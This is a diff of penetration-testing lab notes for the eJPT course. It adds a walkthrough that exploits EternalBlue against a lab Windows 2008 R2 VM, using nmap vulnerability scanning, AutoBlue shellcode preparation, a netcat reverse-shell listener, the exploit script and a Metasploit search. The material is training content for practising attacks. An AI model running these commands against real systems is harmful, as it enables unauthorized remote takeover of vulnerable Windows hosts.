@@ -10,6 +10,8 @@
 >   * `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
 >   * `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
 
+### Enumeration
+
 ```bash
 nmap -sV -sC 10.0.21.78
 ```
@@ -160,11 +162,114 @@ type flag.txt
 
 ## Lab 2 - EternalBlue
 
-{% embed url="https://blog.syselement.com/ine/courses/ejpt/hostnetwork-penetration-testing/1-system-attack/windows-attacks/smb-psexec#lab-2-eternal-blue-extra" %}
+> 🔬 **Extra Lab**
+>
+> Setup a vulnerable _Windows 2008 R2 Virtual Machine_ and connected it to the same network of the Kali virtual machine.
+>
+> * Host system: `Kali Linux`
+> * Target system: `Windown Server 2008 R2`&#x20;
+> * Target IP: `192.168.42.139`&#x20;
+> * Local IP: `192.168.42.132`
+> * Exploitation tool: [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)
+> * Vulnerability: [CVE-2017-0143 - EternalBlue](https://nvd.nist.gov/vuln/detail/CVE-2017-0143) + [CVE-2017-0144](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
 
-{% embed url="https://0xdf.gitlab.io/2019/02/22/wl-dummy.html" %}
+### Enumeration
 
-{% embed url="https://offensive.run/exploit/eternalblue/README.html" %}
+```bash
+nmap -sV -sC 192.168.42.139 -Pn
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+nmap -sV --script smb-vuln-ms17-010 -p445 192.168.42.139 -Pn
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>
+
+### Manual Exploitation
+
+* [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) will be used for the manual exploitation
+
+<figure><img src="../../../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+cd AutoBlue-MS17-010
+pip install -r requirements.txt
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>
+
+* Generate a shellcode that will be exploited on the target system.
+
+```bash
+┌──(k3shi㉿kali)-[~/Downloads/AutoBlue-MS17-010]
+└─$ cd shellcode        
+                                                                                                                  
+┌──(k3shi㉿kali)-[~/Downloads/AutoBlue-MS17-010/shellcode]
+└─$ ls
+eternalblue_kshellcode_x64.asm  eternalblue_kshellcode_x86.asm  eternalblue_sc_merge.py  shell_prep.sh
+                                                                                                                  
+┌──(k3shi㉿kali)-[~/Downloads/AutoBlue-MS17-010/shellcode]
+└─$ chmod +x shell_prep.sh 
+
+┌──(k3shi㉿kali)-[~/Downloads/AutoBlue-MS17-010/shellcode]
+└─$ chmod +x shell_prep.sh 
+
+# LHOST = Local Kali IP address
+# LPORT for x64 = Local Port to listen the reverse shell
+# LPORT for x84 = Same as x64
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
+
+* Set a **`netcat`** listener on the specified port, in another terminal tab
+
+```bash
+┌──(k3shi㉿kali)-[~/Downloads/AutoBlue-MS17-010/shellcode]
+└─$ nc -nvlp 1234                                               
+listening on [any] 1234 ...
+```
+
+* In the `AutoBlue` terminal tab, use the `eternalblue_exploit7.py` to exploit the target from the AutoBlue-MS17-010 directory
+
+```bash
+cd ..
+chmod +x eternalblue_exploit7.py
+python eternalblue_exploit7.py 192.168.31.131 shellcode/sc_x64.bin
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>
+
+* Check the `netcat` tab for the reverse shell
+
+### Automatic Exploitation
+
+```bash
+┌──(k3shi㉿kali)-[~]
+└─$ msfconsole
+
+msf6 > search eternalblue
+```
+
+<figure><img src="../../../../../.gitbook/assets/image (142).png" alt=""><figcaption><p>List of EternalBlue</p></figcaption></figure>
+
+<figure><img src="../../../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
